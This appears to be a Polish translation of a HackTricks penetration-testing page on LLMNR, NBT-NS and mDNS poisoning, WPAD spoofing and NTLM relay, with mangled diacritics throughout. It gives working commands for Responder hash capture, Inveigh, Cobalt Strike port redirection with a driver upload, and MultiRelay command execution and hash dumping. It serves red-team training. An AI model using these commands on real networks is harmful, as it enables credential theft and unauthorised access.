# Podr贸ba LLMNR, NBT-NS, mDNS/DNS oraz ataki WPAD i przekazywanie

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpniaj sztuczki hakerskie, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
{% endhint %}

## Protokoy sieciowe

### Protokoy rozwizywania lokalnych nazw host贸w
- **LLMNR, NBT-NS i mDNS**:
- Microsoft oraz inne systemy operacyjne u偶ywaj LLMNR i NBT-NS do lokalnego rozwizywania nazw, gdy DNS zawodzi. Podobnie systemy Apple i Linux u偶ywaj mDNS.
- Te protokoy s podatne na przechwycenie i podrobienie ze wzgldu na swoj nieuwierzytelnion, rozgoszeniow natur nad UDP.
- [Responder](https://github.com/lgandx/Responder) mo偶e by u偶ywany do podszywania si pod usugi poprzez wysyanie sfaszowanych odpowiedzi do host贸w zapytujcych te protokoy.
- Wicej informacji na temat podszywania si pod usugi za pomoc Responder mo偶na znale藕 [tutaj](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protok贸 automatycznego odkrywania serwera proxy (WPAD)
- WPAD pozwala przegldarkom automatycznie odkrywa ustawienia serwera proxy.
- Odkrywanie jest uatwione poprzez DHCP, DNS lub w razie awarii DNS, poprzez LLMNR i NBT-NS.
- Responder mo偶e automatyzowa ataki WPAD, kierujc klient贸w do zoliwych serwer贸w WPAD.

### Responder do zatrucia protoko贸w
- **Responder** to narzdzie u偶ywane do zatruwania zapyta LLMNR, NBT-NS i mDNS, selektywnie odpowiadajc na podstawie typ贸w zapyta, g贸wnie kierujc si w stron usug SMB.
- Jest preinstalowany w Kali Linux, konfigurowalny pod cie偶k `/etc/responder/Responder.conf`.
- Responder wywietla przechwycone hashe na ekranie i zapisuje je w katalogu `/usr/share/responder/logs`.
- Obsuguje zar贸wno IPv4, jak i IPv6.
- Windowsowa wersja Respondera jest dostpna [tutaj](https://github.com/lgandx/Responder-Windows).

#### Uruchamianie Respondera
- Aby uruchomi Respondera z domylnymi ustawieniami: `responder -I <Interfejs>`
- Dla bardziej agresywnego sondowania (z potencjalnymi skutkami ubocznymi): `responder -I <Interfejs> -P -r -v`
- Techniki przechwytywania wyzwa/odpowiedzi NTLMv1 dla atwiejszego amania: `responder -I <Interfejs> --lm --disable-ess`
- Podszywanie si pod WPAD mo偶na aktywowa za pomoc: `responder -I <Interfejs> --wpad`
- Zapytania NetBIOS mog by rozwizane do IP atakujcego, a proxy autoryzacji mo偶e by ustawione: `responder.py -I <interfejs> -Pv`

### Zatrucie DHCP za pomoc Respondera
- Podszywanie si pod odpowiedzi DHCP mo偶e trwale zatru informacje o trasowaniu ofiary, oferujc bardziej skryt alternatyw dla podszywania ARP.
- Wymaga precyzyjnej wiedzy o konfiguracji sieci docelowej.
- Uruchomienie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda mo偶e skutecznie przechwytywa hashe NTLMv1/2, ale wymaga ostro偶nego postpowania, aby unikn zak贸ce w sieci.

### Przechwytywanie powiadcze za pomoc Respondera
- Responder bdzie podszywa si pod usugi za pomoc wspomnianych powy偶ej protoko贸w, przechwytujc powiadczenia (zwykle wyzwanie/odpowied藕 NTLMv2), gdy u偶ytkownik pr贸buje uwierzytelni si wobec podszytych usug.
- Mo偶na pr贸bowa zdegradowa do NetNTLMv1 lub wyczy ESS dla uatwienia amania powiadcze.

Nale偶y pamita, 偶e stosowanie tych technik powinno odbywa si legalnie i etycznie, zapewniajc odpowiednie upowa偶nienie i unikajc zak贸ce lub nieautoryzowanego dostpu.

## Inveigh

Inveigh to narzdzie dla tester贸w penetracyjnych i zespo贸w czerwonych, przeznaczone dla system贸w Windows. Oferuje funkcjonalnoci podobne do Responder, wykonujc ataki podszywania i man-in-the-middle. Narzdzie ewoluowao z skryptu PowerShell do binarnej wersji C#, z [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) jako g贸wne wersje. Szczeg贸owe parametry i instrukcje mo偶na znale藕 w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh mo偶na obsugiwa za pomoc PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub wykonany jako plik binarny C#:
```bash
Inveigh.exe
```
### Atak przekazywania NTLM

Ten atak wykorzystuje sesje uwierzytelniania SMB do uzyskania dostpu do docelowego komputera, co umo偶liwia uzyskanie powoki systemowej w przypadku powodzenia. Kluczowe wymagania to:
- Uwierzytelniony u偶ytkownik musi mie dostp do lokalnego administratora na hostingu przekazywanym.
- Podpisywanie SMB powinno by wyczone.

#### Przekierowywanie i tunelowanie portu 445

W przypadkach, gdy bezporednie wprowadzenie sieciowe nie jest wykonalne, ruch na porcie 445 musi by przekierowany i przepuszczony przez tunel. Narzdzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagaj w przekierowywaniu ruchu portu 445 na inny port, co jest istotne, gdy dostp do lokalnego administratora jest dostpny do adowania sterownika.

Konfiguracja i dziaanie PortBender w Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzdzia do ataku przekazywania NTLM

- **Metasploit**: Skonfiguruj z proxy, lokalnymi i zdalnymi szczeg贸ami hosta.
- **smbrelayx**: Skrypt Pythona do przekazywania sesji SMB i wykonywania polece lub implementowania tylnych drzwi.
- **MultiRelay**: Narzdzie z pakietu Responder do przekazywania okrelonych u偶ytkownik贸w lub wszystkich u偶ytkownik贸w, wykonywania polece lub wycigania hase.

Ka偶de narzdzie mo偶na skonfigurowa do dziaania poprzez proxy SOCKS, jeli jest to konieczne, umo偶liwiajc ataki nawet przy porednim dostpie do sieci.

### Dziaanie MultiRelay

MultiRelay jest uruchamiany z katalogu _**/usr/share/responder/tools**_, docelowo okrelajc konkretne adresy IP lub u偶ytkownik贸w.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Wymuszaj logowania NTLM

W systemie Windows **mo偶esz by w stanie zmusi niekt贸re uprzywilejowane konta do uwierzytelniania si na dowolnych maszynach**. Przeczytaj nastpujc stron, aby dowiedzie si jak:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Odnoniki
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plan subskrypcyjny**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
